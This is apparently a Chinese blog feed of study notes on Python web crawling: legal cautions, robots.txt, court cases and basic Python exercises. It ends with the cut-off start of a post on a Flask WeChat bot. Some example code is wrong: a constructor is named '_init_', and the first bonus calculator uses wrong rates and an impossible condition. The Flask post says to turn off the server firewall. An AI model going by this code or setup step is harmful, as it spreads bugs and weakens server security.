大数据及爬虫</h3><p>技术创新驱动变革的潮流。<br>数据量爆发式增长的互联网时代。<br>大数据分析的火热。<br>大数据成为业界与学术界最火热的话题之一。<br>数据已经成为每个公司极为重要的资产。<br>互联网大量的公开数据为个人和公司提供了以往想象不到的可以获取的数据量。<br>网络爬虫技术是大数据分析的第一环。有助于获取有用的公开数据集。<br>理解了信息的获取、存储和整理，才有可能系统地收集和应用不同源头和千变万化的网站信息。<br>DT的核心是从信息的源头去理解和分析，以做出能打动对方的行动决策方案。<br>由谷歌搜索到现在的大数据时代，爬虫技术的重要性和广泛性一直很突出。<br>爬取目标网站的资料、分析和建立应用。 获取数据自动、实时、及时、省时。<br>电商市场的重要性日益凸显。了解对手的产品特点、价格以及销量情况，及时跟进产品开发进度和营销策略，从而知己知彼，赢得竞争。过去，两个痛点——无法自动化和无法实时获取。产品研发部门会手动访问一个个电商产品页面，人工复制并粘贴到Excel表格中，制作竞品分析报告。但是这种重复性的手动工作不仅浪费宝贵的时间，一不留神复制少了一个数字还会导致数据错误；对手产品的销量则是由某一家咨询公司提供报告，每周一次，但是报告缺乏实时性，难以针对快速多变的市场及时调整价格和营销策略。<br>学会一项新的技术<br>第一方企业（也就是拥有这些数据的企业）做出更好的决策<br>第三方企业也可从中受益<br>数据共享<br>Python：热门的开源软件（这意味着有人源源不断地开发更新且更强大的包给你用）<br>Python：简单、简洁、易学、有效、可扩展性的计算机语言。 最受欢迎的程序语言之一。 强大而丰富的库。<br>C语言：底层，学习成本大。  </p><h3 id="6-2-2-Jupyter"><a href="#6-2-2-Jupyter" class="headerlink" title="6.2.2. Jupyter"></a>6.2.2. Jupyter</h3><p>为什么推荐大家使用Jupyter学习和编写Python脚本呢？<br>Jupyter：交互式编程和展示功能。<br>分段执行，编写和测试时边看边写，加快调试速度。<br>能够把运行和输出的结果保存下来，下次打开这个Notebook时也可以看到之前运行的结果。<br>还可以添加各种元素，比如图片、视频、链接等，同时还支持Markdown，可以充当PPT使用。  </p><h2 id="6-3-如何"><a href="#6-3-如何" class="headerlink" title="6.3. 如何"></a>6.3. 如何</h2><p>不断解决遇到的疑惑。<br>科技如何给大家带来实效<br>数据的存储对公司有什么影响<br>如何存储数据⇒高效利用 方便对接其他部门和业务<br>如何使用淘宝网上所有绿色产品（如空气净化器）的销量数据来做潜在市场评估<br>如何一直高效率、持续不断地从日新月异的网站中获取信息  </p><h3 id="6-3-1-快捷"><a href="#6-3-1-快捷" class="headerlink" title="6.3.1. 快捷"></a>6.3.1. 快捷</h3><p>对初学者来说，使用BeautifulSoup从网页中提取需要的数据更加简单易用。  </p><p>谷歌的有效信息检索速度比百度快<br>Stack Overflow上的回答可以比较快地解决问题<br>最新最好的回答很有可能是英文的  </p><h3 id="6-3-2-获取动态网页的真实地址"><a href="#6-3-2-获取动态网页的真实地址" class="headerlink" title="6.3.2. 获取动态网页的真实地址"></a>6.3.2. 获取动态网页的真实地址</h3><p>Chrome浏览器的检查（审查元素）功能：浏览器右键⇒检查⇒Network⇒XHR或JS选项<br>Network：显示浏览器从网页服务器中得到的所有文件。一般这些数据以json文件格式获取。<br>在Network选项卡下，找到真正的评论文件。<br>单击Preview标签即可查看数据。可以按 ctrl+F 进行查找。顶部search也可以。<br>Elements会出现相应的code所在的地方。  </p><h2 id="6-4-应用场景"><a href="#6-4-应用场景" class="headerlink" title="6.4. 应用场景"></a>6.4. 应用场景</h2><h3 id="6-4-1-爬虫"><a href="#6-4-1-爬虫" class="headerlink" title="6.4.1. 爬虫"></a>6.4.1. 爬虫</h3><p>一些附加值更高的“事”，如人工智能、统计建模等。<br>机器学习和统计算法分析<br>在营销领域可以帮助企业做好4P（Product：产品创新，Place：智能选址，Price：动态价格，Promotion：数据驱动的营销活动）<br>在金融领域，数据驱动的征信等应用会带来越来越大的价值。<br>公开数据的应用价值<br>所有网络数据<br>社交媒体的每一条发帖。社交媒体在用户生态圈的自我交互下产生大量文本、图片和视频数据。<br>团购网站的价格及点评。电商商产品的描述、价格<br>招聘网站的招聘信息<br>搜索引擎从数据库中提取搜索结果  </p><h2 id="6-5-注意事项"><a href="#6-5-注意事项" class="headerlink" title="6.5. 注意事项"></a>6.5. 注意事项</h2><p>爬虫有哪些潜在的法律纠纷、公司的爬虫合不合法 。<br>建立共利的互联网环境，不能把爬虫作为窃取数据的工具。<br>爬虫必须在合情、合法、合理的情况下获取和应用。<br>尊重数据供应者的知识产权和正常运作才能产生长久共利的环境。<br>保障对方平台的正常运作是每个程序员都应当做到的<br>法律：<br>互联网世界已经通过自身的协议建立起一定的道德规范（Robots协议）。该协议是国际互联网界通行的道德规范，虽然没有写入法律，但是每一个爬虫都应该遵守这项协议。<br>法律部分还在建立和完善中。<br>如果抓取的数据属于个人使用或科研范畴，基本不存在问题。当你爬取网站数据时，无论是否仅供个人使用，都应该遵守Robots协议。<br>而如果数据属于商业盈利范畴，就要就事而论，有可能属于违法行为，也有可能不违法。<br>大部分网站不欢迎使用程序进行登录，因为需要登录才能查看的数据不属于公开数据。最好不要使用此程序获取非公开数据或批量注册，若出现了问题，可能需负法律责任。  </p><p>建议使用API。  </p><p>Robots协议<br>Robots协议（爬虫协议）的全称是“网络爬虫排除标准”（Robots Exclusion Protocol），网站通过Robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取。  </p><p><a href="https://www.taobao.com/robots.txt。" target="_blank" rel="noopener">https://www.taobao.com/robots.txt。</a><br>Allow开头的URL是允许robot访问的。例如，Allow:/article允许百度爬虫引擎访问/article.htm、/article/12345.com等。<br>Disallow不允许百度爬虫引擎访问的。例如，Disallow:/product/不允许百度爬虫引擎访问/product/12345.com等。<br>Disallow:/禁止百度爬虫访问除了Allow规定页面外的其他所有页面。  </p><p>taobao的robots.txt对不同的搜索引擎所允许爬行范围不同。/product项对应淘宝内部的产品信息。当在搜索框中搜索“淘宝iphone7”的时候，Google可搜到淘宝中的产品，而百度不能。  </p><p>过于快速或者频密的网络爬虫都会对服务器产生巨大的压力。→调集资源限制爬虫，保护用户的流量和减少有价值数据的流失。  </p><p>反爬方维权：网站封锁你IP，法律行动。  </p><p>将请求的速度限定在一个合理的范围之内。  </p><p>每年的三月份会迎来一个爬虫高峰期。因为有大量的大学生五月份交论文，在写论文的时候会选择爬取数据，也就是3月份爬取数据，4月份分析数据，5月份交论文。  </p><p>2007年，爱帮网利用垂直搜索技术获取了大众点评网上的商户简介和消费者点评，并且直接大量使用，大众点评网多次要求爱帮网停止使用这些内容，而爱帮网以自己是使用垂直搜索获得的数据为由，拒绝停止抓取大众点评网上的内容，并且质疑大众点评网对这些内容所享有的著作权。为此，双方开打了两场官司。2011年1月，北京海淀法院做出判决：爱帮网侵犯大众点评网著作权成立，应当停止侵权并赔偿大众点评网经济损失和诉讼必要支出。<br>2013年10月，百度诉360违反Robots协议。百度方面认为，360违反了Robots协议，擅自抓取、复制百度网站内容并生成快照向用户提供。2014年8月7日，北京市第一中级人民法院做出一审判决，法院认为被告奇虎360的行为违反了《反不正当竞争法》相关规定，应赔偿原告百度公司70万元。<br>虽然说大众点评上的点评数据、百度知道的问答由用户创建而非企业，但是搭建平台需要投入运营、技术和人力成本，所以平台拥有对数据的所有权、使用权和分发权。【网站的知识产权】<br>以上两起败诉告诉我们，在爬取网站的时候需要限制自己的爬虫，遵守Robots协议和约束网络爬虫程序的速度。如果违反了这些规定，很可能会吃官司，并且败诉的概率相当高。  </p><h1 id="7-多项关系"><a href="#7-多项关系" class="headerlink" title="7. 多项关系"></a>7. 多项关系</h1><h2 id="7-1-流程图"><a href="#7-1-流程图" class="headerlink" title="7.1. 流程图"></a>7.1. 流程图</h2><p>具体步骤及各步骤之间的关系。  </p><h3 id="7-1-1-网络爬虫、数据采集"><a href="#7-1-1-网络爬虫、数据采集" class="headerlink" title="7.1.1. 网络爬虫、数据采集"></a>7.1.1. 网络爬虫、数据采集</h3><p>获【取】网页、解【析】网页（提取数据）、【存】储数据、整【理】。  </p><ul><li>获取网页：给一个网址发送请求，该网址会返回整个网页的数据。类似于在浏览器中键入网址并按回车键，然后可以看到网站的整个页面。  </li><li>解析网页：从整个网页的数据中提取想要的数据。类似于在浏览器中看到网站的整个页面，但是你想找的是产品的价格，价格就是你想要的数据。  </li><li>存储数据：把数据存储下来。  </li></ul><p>三个流程的技术实现:  </p><ul><li>获取网页<br>获取网页的基础技术：request、urllib和selenium（模拟浏览器）。<br>获取网页的进阶技术：多进程多线程抓取、登录抓取、突破IP封禁和服务器抓取。  </li><li>解析网页<br>解析网页的基础技术：re正则表达式、BeautifulSoup和lxml。<br>解析网页的进阶技术：解决中文乱码。  </li><li>存储数据<br>存储数据的基础技术：存入txt文件和存入csv文件。<br>存储数据的进阶技术：存入MySQL数据库和存入MongoDB数据库。  </li></ul><h2 id="7-2-分类树"><a href="#7-2-分类树" class="headerlink" title="7.2. 分类树"></a>7.2. 分类树</h2><h2 id="7-3-对比分析"><a href="#7-3-对比分析" class="headerlink" title="7.3. 对比分析"></a>7.3. 对比分析</h2><h2 id="7-4-关系图"><a href="#7-4-关系图" class="headerlink" title="7.4. 关系图"></a>7.4. 关系图</h2><p>互联网的运作和结构<br>爬虫程序是收集信息的基础。  </p><p>==============================  </p><h1 id="8-元学习（与物）"><a href="#8-元学习（与物）" class="headerlink" title="8. 元学习（与物）"></a>8. 元学习（与物）</h1><p>起始、终止、空格和换行，循环次数<br>是啥 为啥 逻辑清晰、循序渐进 查阅此书<br>动其心者，当具有大本大源<br>不断学习新技术，自我提高，实现目标和理想。不断更新和进步：互联网科技、网站信息也随之不断改变。<br>不能应用的技术称为魔术，只能用于表演。<br>学习的道路没有什么捷径可走，唯一的方法就是不断尝试、不断失败、不断改进。<br>通过实战解决实际问题。问题及解决方案实践<br>增强学习效果<br>富有逻辑的框架解构学习。将网络爬虫技术进行框架性的解构<br>认真阅读、手输代码，反复练习，熟能生巧。提升你的编程能力和编程效率<br>从实践中检验自己学习了多少知识<br>进一步巩固<br>进阶问题<br>答案并不是唯一解，对比思路  </p><h1 id="9-个人提升（与人）"><a href="#9-个人提升（与人）" class="headerlink" title="9. 个人提升（与人）"></a>9. 个人提升（与人）</h1><p>了解技术团队的运作模式<br>向香港中文大学市场营销学的研究生讲解Python网络爬虫技术，让这些商科学生掌握一些大数据时代重要的技术能力。<br>KYM框架<br>Know Your Company（了解你的公司）<br>Know Your Competitor（了解你的竞争对手）<br>Know Your Customer（了解你的客户）  </p><h1 id="10-代码清单"><a href="#10-代码清单" class="headerlink" title="10. 代码清单"></a>10. 代码清单</h1><h2 id="10-1-基础语法"><a href="#10-1-基础语法" class="headerlink" title="10.1. 基础语法"></a>10.1. 基础语法</h2><h3 id="10-1-1-py"><a href="#10-1-1-py" class="headerlink" title="10.1.1. py"></a>10.1.1. py</h3><p>int(number)<br>float(number)<br>for key,value in dict.items()<br>Python 100例 <a href="https://www.w3cschool.cn/python/python-100-examples.html" target="_blank" rel="noopener">https://www.w3cschool.cn/python/python-100-examples.html</a>  </p><h4 id="10-1-1-1-类"><a href="#10-1-1-1-类" class="headerlink" title="10.1.1.1. 类"></a>10.1.1.1. 类</h4><pre><code class="py"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>:</span>   <span class="comment"># 创建类          </span>    <span class="function"><span class="keyword">def</span> <span class="title">_init_</span><span class="params">(self,name,age)</span>:</span>          <span class="comment"># _init_()方法称为类的构造方法。会自动执行。初始化以及规定传递的参数。self后面的参数列表。实例则传给self  </span>        <span class="comment"># self 仅在类的定义中使用。表示对整个传递来的对象进行操作。  </span>        <span class="comment"># 运行时类中self.会自动转为传进来obInstance.进行运算，即self = obInstance【自我理解】  </span>        self.name = name                      self.age = age              <span class="function"><span class="keyword">def</span> <span class="title">detail</span><span class="params">(self)</span>:</span> <span class="comment">#通过self调用被封装的内容              </span>        <span class="keyword">print</span> (self.name)                      <span class="keyword">print</span> (self.age)      obj1 = Person(<span class="string">'santos'</span>,<span class="number">18</span>)      obj1.detail()  <span class="comment"># Python将obj1传给self参数，'santos'和18传给类的构造方法_init_中的name和age  </span><span class="comment"># 猫可以：喵喵叫、吃、喝、拉、撒  </span><span class="comment"># 狗可以：汪汪叫、吃、喝、拉、撒  </span><span class="comment"># 如果用继承的思想，就可以写成：  </span><span class="comment"># 动物：吃喝拉撒  </span><span class="comment"># 猫：喵喵叫（猫继承动物的功能）  </span><span class="comment"># 狗：汪汪叫（狗继承动物的功能）  </span><span class="class"><span class="keyword">class</span> <span class="title">Animal</span>:</span>      <span class="function"><span class="keyword">def</span> <span class="title">eat</span><span class="params">(self)</span>:</span>          <span class="keyword">print</span> (<span class="string">"%s吃 "</span> %self.name)      <span class="function"><span class="keyword">def</span> <span class="title">drink</span><span class="params">(self)</span>:</span>          <span class="keyword">print</span> (<span class="string">"%s喝 "</span> %self.name)      <span class="function"><span class="keyword">def</span> <span class="title">shit</span><span class="params">(self)</span>:</span>          <span class="keyword">print</span> (<span class="string">"%s拉 "</span> %self.name)      <span class="function"><span class="keyword">def</span> <span class="title">pee</span><span class="params">(self)</span>:</span>          <span class="keyword">print</span> (<span class="string">"%s撒 "</span> %self.name)  <span class="class"><span class="keyword">class</span> <span class="title">Cat</span><span class="params">(Animal)</span>:</span>      <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,name)</span>:</span>          self.name = name      <span class="function"><span class="keyword">def</span> <span class="title">cry</span><span class="params">(self)</span>:</span>          <span class="keyword">print</span> (<span class="string">'喵喵叫'</span>)  <span class="class"><span class="keyword">class</span> <span class="title">Dog</span><span class="params">(Animal)</span>:</span>      <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,name)</span>:</span>          self.name = name      <span class="function"><span class="keyword">def</span> <span class="title">cry</span><span class="params">(self)</span>:</span>          <span class="keyword">print</span> (<span class="string">'汪汪叫'</span>)  c1 = Cat(<span class="string">'小白家的小黑猫'</span>)  c1.eat()  c1.cry()  d1 = Dog(<span class="string">'胖子家的小瘦狗'</span>)  d1.eat()  <span class="comment"># 小白家的小黑猫吃  </span><span class="comment"># 喵喵叫  </span><span class="comment"># 胖子家的小瘦狗吃  </span></code></pre><h3 id="10-1-2-函数、类，可变与不可变"><a href="#10-1-2-函数、类，可变与不可变" class="headerlink" title="10.1.2. 函数、类，可变与不可变"></a>10.1.2. 函数、类，可变与不可变</h3><pre><code class="py">a = <span class="number">1</span>  <span class="function"><span class="keyword">def</span> <span class="title">fun</span><span class="params">(a)</span>:</span>      a = <span class="number">2</span>  fun(a)  <span class="keyword">print</span> (a)  &gt;&gt;&gt;<span class="number">1</span>  a为数字int，函数改变不了函数以外a的值。当一个引用传递给函数时，函数自动复制一份引用。函数里和函数外的引用是不一样的。  a = []  <span class="function"><span class="keyword">def</span> <span class="title">fun</span><span class="params">(a)</span>:</span>      a.append(<span class="number">1</span>)  fun(a)  <span class="keyword">print</span> (a)  &gt;&gt;&gt;[<span class="number">1</span>]  a为列表，函数将函数以外的a值改变了。函数内的引用指向的是可变对象列表a，函数内的列表a和函数外的列表a是同一个。  <span class="class"><span class="keyword">class</span> <span class="title">Person</span>:</span>      name=<span class="string">"aaa"</span>  p1=Person()  p2=Person()  p1.name=<span class="string">"bbb"</span>  <span class="keyword">print</span> (p1.name)  <span class="keyword">print</span> (p2.name)  <span class="keyword">print</span> (Person.name)  &gt;&gt;&gt;bbb  &gt;&gt;&gt;aaa  &gt;&gt;&gt;aaa  p1.name=<span class="string">"bbb"</span>表示实例调用了类变量，其实就是函数传参的问题。p1.name一开始指向类变量name=<span class="string">"aaa"</span>，但是在实例的作用域里把类变量的引用改变了，就变成了一个实例变量，self.name不再引用Person的类变量name了。  <span class="class"><span class="keyword">class</span> <span class="title">Person</span>:</span>      name=[]  p1=Person()  p2=Person()  p1.name.append(<span class="number">1</span>)  <span class="keyword">print</span> (p1.name)  <span class="keyword">print</span> (p2.name)  <span class="keyword">print</span> (Person.name)  &gt;&gt;&gt;[<span class="number">1</span>]  &gt;&gt;&gt;[<span class="number">1</span>]  &gt;&gt;&gt;[<span class="number">1</span>]  !类中的可变量的慎重使用！！！！！！！！！！！！！！！ist、dict等是可更改对象，因此修改一个指向的对象时会把类变量也改变了。  </code></pre><h2 id="10-2-基础算法"><a href="#10-2-基础算法" class="headerlink" title="10.2. 基础算法"></a>10.2. 基础算法</h2><h3 id="10-2-1-循环打印输出从1到100的所有奇数"><a href="#10-2-1-循环打印输出从1到100的所有奇数" class="headerlink" title="10.2.1. 循环打印输出从1到100的所有奇数"></a>10.2.1. 循环打印输出从1到100的所有奇数</h3><pre><code class="py"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">101</span>):      <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">1</span>:          <span class="keyword">print</span> (i)  </code></pre><h3 id="10-2-2-字符串批量替换"><a href="#10-2-2-字符串批量替换" class="headerlink" title="10.2.2. 字符串批量替换"></a>10.2.2. 字符串批量替换</h3><p>请将字符串“你好$$$我正在学Python@#@#现在需要&amp;<em>&amp;</em>&amp;修改字符串”中的符号变成一个空格，需要输出的格式为：“你好 我正在学Python现在需要 修改字符串”。  </p><pre><code class="py"><span class="comment"># 方法1  </span>str1 = <span class="string">'你好$$$我正在学Python@#@#现在需要&amp;%&amp;%&amp;修改字符串'</span>  str2 = str1.replace(<span class="string">'$$$'</span>, <span class="string">' '</span>).replace(<span class="string">'@#@#'</span>, <span class="string">' '</span>).replace(<span class="string">'&amp;%&amp;%&amp;'</span>, <span class="string">' '</span>)  <span class="keyword">print</span> (str2)  <span class="comment"># 方法2  </span><span class="keyword">import</span> re  str1 = <span class="string">'你好$$$我正在学Python@#@#现在需要&amp;%&amp;%&amp;修改字符串'</span>  str2 = re.sub(<span class="string">'[$@#&amp;%]+'</span>, <span class="string">' '</span> ,str1)  <span class="keyword">print</span> (str2)  </code></pre><h3 id="10-2-3-输出9×9乘法口诀表"><a href="#10-2-3-输出9×9乘法口诀表" class="headerlink" title="10.2.3. 输出9×9乘法口诀表"></a>10.2.3. 输出9×9乘法口诀表</h3><pre><code class="py"><span class="comment"># 此法会有多余的换行和末尾对于的空格  </span><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):      <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,i+<span class="number">1</span>):          print(<span class="string">'{}×{}={}'</span>.format(j,i,j*i),end=<span class="string">' '</span>)      print(<span class="string">'\n'</span>)  <span class="comment"># 更好的方法，没有对齐  </span><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):      <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,i+<span class="number">1</span>):          print(<span class="string">'{}×{}={} '</span>.format(j,i,j*i),end=<span class="string">''</span>)      print(<span class="string">''</span>)  <span class="comment"># 最好的方法 这里是对齐的。由此可见，'\t'是用来【显示】对齐的，但似乎len就是1  </span><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):      <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,i+<span class="number">1</span>):          print(<span class="string">'{}×{}={}\t'</span>.format(j,i,j*i),end=<span class="string">''</span>)      print(<span class="string">''</span>)  <span class="comment"># 最好的方法 这里是对齐的  </span><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">10</span>):      <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>, i+<span class="number">1</span>):          <span class="keyword">print</span> (<span class="string">"%dx%d=%d\t"</span> % (j, i, i*j), end=<span class="string">""</span>)      print(<span class="string">""</span>)  <span class="comment"># 1×1=1  </span><span class="comment"># 1×2=2 2×2=4  </span><span class="comment"># 1×3=3 2×3=6 3×3=9  </span><span class="comment"># 1×4=4 2×4=8 3×4=12 4×4=16  </span><span class="comment"># 1×5=5 2×5=10 3×5=15 4×5=20 5×5=25   </span><span class="comment"># 1×6=6 2×6=12 3×6=18 4×6=24 5×6=30 6×6=36  </span><span class="comment"># 1×7=7 2×7=14 3×7=21 4×7=28 5×7=35 6×7=42 7×7=49  </span><span class="comment"># 1×8=8 2×8=16 3×8=24 4×8=32 5×8=40 6×8=48 7×8=56 8×8=64  </span><span class="comment"># 1×9=9 2×9=18 3×9=27 4×9=36 5×9=45 6×9=54 7×9=63 8×9=72 9×9=81  </span><span class="comment"># 1×1=1  </span><span class="comment"># 1×2=2 2×2=4  </span><span class="comment"># 1×3=3 2×3=6 3×3=9  </span><span class="comment"># 1×4=4 2×4=8 3×4=12 4×4=16  </span><span class="comment"># 1×5=5 2×5=10 3×5=15 4×5=20 5×5=25  </span><span class="comment"># 1×6=6 2×6=12 3×6=18 4×6=24 5×6=30 6×6=36  </span><span class="comment"># 1×7=7 2×7=14 3×7=21 4×7=28 5×7=35 6×7=42 7×7=49  </span><span class="comment"># 1×8=8 2×8=16 3×8=24 4×8=32 5×8=40 6×8=48 7×8=56 8×8=64  </span><span class="comment"># 1×9=9 2×9=18 3×9=27 4×9=36 5×9=45 6×9=54 7×9=63 8×9=72 9×9=81  </span><span class="comment"># 1×1=1  </span><span class="comment"># 1×2=2   2×2=4  </span><span class="comment"># 1×3=3   2×3=6   3×3=9  </span><span class="comment"># 1×4=4   2×4=8   3×4=12  4×4=16  </span><span class="comment"># 1×5=5   2×5=10  3×5=15  4×5=20  5×5=25  </span><span class="comment"># 1×6=6   2×6=12  3×6=18  4×6=24  5×6=30  6×6=36  </span><span class="comment"># 1×7=7   2×7=14  3×7=21  4×7=28  5×7=35  6×7=42  7×7=49  </span><span class="comment"># 1×8=8   2×8=16  3×8=24  4×8=32  5×8=40  6×8=48  7×8=56  8×8=64  </span><span class="comment"># 1×9=9   2×9=18  3×9=27  4×9=36  5×9=45  6×9=54  7×9=63  8×9=72  9×9=81  </span><span class="comment"># 1x1=1  </span><span class="comment"># 1x2=2   2x2=4  </span><span class="comment"># 1x3=3   2x3=6   3x3=9  </span><span class="comment"># 1x4=4   2x4=8   3x4=12  4x4=16  </span><span class="comment"># 1x5=5   2x5=10  3x5=15  4x5=20  5x5=25  </span><span class="comment"># 1x6=6   2x6=12  3x6=18  4x6=24  5x6=30  6x6=36  </span><span class="comment"># 1x7=7   2x7=14  3x7=21  4x7=28  5x7=35  6x7=42  7x7=49  </span><span class="comment"># 1x8=8   2x8=16  3x8=24  4x8=32  5x8=40  6x8=48  7x8=56  8x8=64  </span><span class="comment"># 1x9=9   2x9=18  3x9=27  4x9=36  5x9=45  6x9=54  7x9=63  8x9=72  9x9=81  </span>print(len(<span class="string">'{}\t'</span>.format(<span class="number">5</span>*<span class="number">6</span>)))  print(len(<span class="string">'{}\t'</span>.format(<span class="number">5</span>*<span class="number">60</span>)))  print(len(<span class="string">'{}\t'</span>.format(<span class="number">5</span>*<span class="number">600</span>)))  print(len(<span class="string">'{}\t'</span>.format(<span class="number">5</span>*<span class="number">6000</span>)))  <span class="comment"># 3  </span><span class="comment"># 4  </span><span class="comment"># 5  </span><span class="comment"># 6  </span></code></pre><h3 id="10-2-4-利润分段计算"><a href="#10-2-4-利润分段计算" class="headerlink" title="10.2.4. 利润分段计算"></a>10.2.4. 利润分段计算</h3><p>请写出一个函数，当输入函数变量月利润为I时，能返回应发放奖金的总数。例如，输出“利润为100000元时，应发放奖金总数为10000元”。<br>其中，企业发放的奖金根据利润提成。<br>利润（I）低于或等于10万元时，奖金可提10%；<br>利润高于10万元，低于20万元时，低于10万元的部分按10%提成，高于10万元的部分，可提成7.5%；<br>利润在20万元到40万元之间时，高于20万元的部分可提成5%；<br>利润在40万元到60万元之间时，高于40万元的部分可提成3%；<br>利润在60万元到100万元之间时，高于60万元的部分可提成1.5%；<br>利润高于100万元时，超过100万元的部分按1%提成。  </p><pre><code class="py"><span class="function"><span class="keyword">def</span> <span class="title">calcute_profit</span><span class="params">(I)</span>:</span>      I = I / <span class="number">10000</span>      <span class="keyword">if</span> I &lt;= <span class="number">10</span>:          a = I * <span class="number">0.01</span>          <span class="keyword">return</span> a * <span class="number">10000</span>      <span class="keyword">elif</span> I &lt;= <span class="number">20</span> <span class="keyword">and</span> I &gt; <span class="number">10</span>:          b =<span class="number">0.25</span> + I * <span class="number">0.075</span>          <span class="keyword">return</span> b * <span class="number">10000</span>      <span class="keyword">elif</span> I &lt;= <span class="number">40</span> <span class="keyword">and</span> I &gt; <span class="number">20</span>:          c = <span class="number">0.75</span> + I * <span class="number">0.05</span>          <span class="keyword">return</span> c * <span class="number">10000</span>      <span class="keyword">elif</span> I &lt;= <span class="number">60</span> <span class="keyword">and</span> I &gt; <span class="number">40</span>:          d = <span class="number">0.95</span> + I * <span class="number">0.03</span>          <span class="keyword">return</span> d * <span class="number">10000</span>      <span class="keyword">elif</span> I &lt;= <span class="number">60</span> <span class="keyword">and</span> I &gt; <span class="number">100</span>:          e = <span class="number">2</span> + I * <span class="number">0.015</span>          <span class="keyword">return</span> e * <span class="number">10000</span>      <span class="keyword">else</span>:          f = <span class="number">2.95</span> + I * <span class="number">0.01</span>          <span class="keyword">return</span> f * <span class="number">10000</span>  I = int(input(<span class="string">'净利润:'</span>))  profit = calcute_profit(I)  <span class="keyword">print</span> (<span class="string">'利润为%d元时，应发奖金总数为%d元'</span> % (I, profit))  <span class="function"><span class="keyword">def</span> <span class="title">calcute_profit</span><span class="params">(I)</span>:</span>      arr = [<span class="number">1000000</span>,<span class="number">600000</span>,<span class="number">400000</span>,<span class="number">200000</span>,<span class="number">100000</span>,<span class="number">0</span>] <span class="comment">#这应该就是各个分界值了，把它们放在列表里方便访问  </span>    rat = [<span class="number">0.01</span>,<span class="number">0.015</span>,<span class="number">0.03</span>,<span class="number">0.05</span>,<span class="number">0.075</span>,<span class="number">0.1</span>] <span class="comment">#这是各个分界值所对应的奖金比例值  </span>    r = <span class="number">0</span>                       <span class="comment">#这是总奖金的初始值  </span>    <span class="keyword">for</span> idx <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">6</span>):      <span class="comment">#有6个分界值当然要循环6次  </span>        <span class="keyword">if</span> I &gt; arr[idx]:              r = r + (I - arr[idx]) * rat[idx]              I = arr[idx]      <span class="keyword">return</span> r  I = int(input(<span class="string">'净利润:'</span>))  profit = calcute_profit(I)  <span class="keyword">print</span> (<span class="string">'利润为%d元时，应发奖金总数为%d元'</span> % (I, profit))  </code></pre><h3 id="10-2-5-字典排序"><a href="#10-2-5-字典排序" class="headerlink" title="10.2.5. 字典排序"></a>10.2.5. 字典排序</h3><p>用字典的值对字典进行排序，将{1: 2, 3: 4, 4:3, 2:1, 0:0}按照字典的值从大到小进行排序。  </p><pre><code class="py"><span class="keyword">import</span> operator  x = {<span class="number">1</span>: <span class="number">2</span>, <span class="number">3</span>: <span class="number">4</span>, <span class="number">4</span>:<span class="number">3</span>, <span class="number">2</span>:<span class="number">1</span>, <span class="number">0</span>:<span class="number">0</span>}  sorted_x = sorted(x.items(), key=operator.itemgetter(<span class="number">1</span>))  <span class="keyword">print</span> (sorted_x)  </code></pre><p>[(0, 0), (2, 1), (1, 2), (4, 3), (3, 4)]<br>对字典进行排序是【不可能】的，只有把字典【转换】成另一种方式才能排序。字典本身是无序的，但是如列表元组等其他类型是有序的，所以需要用一个元组列表来表示排序的字典。  </p></h3>]]></content>
      
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
            <tag> 体系 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows环境下用Flask开发微信公众号</title>
      <link href="/cs/windows%E4%B8%8B%E7%94%A8Flask%E5%BC%80%E5%8F%91%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
      <url>/cs/windows%E4%B8%8B%E7%94%A8Flask%E5%BC%80%E5%8F%91%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/</url>
      
        <content type="html"><![CDATA[<p>微信公众号是不错的图床。也可以做做微信机器人。无需穿透工具。<br>目前此项目依托Flask，接入了文本复读机和给图片提供图床的功能。<br>后面会加入批量图片OCR功能。<br><a id="more"></a></p><h2 id="事前准备"><a href="#事前准备" class="headerlink" title="事前准备"></a>事前准备</h2><p>一台服务器、一个已开通的公众号。<br>服务器Python环境下的第三方库：Flask、xmltodict。</p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><ul><li>配置服务器的安全组，打开80端口。</li><li>关闭服务器防火墙。</li><li>将下面的代码保存为wechat.py放在服务器上。</li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span 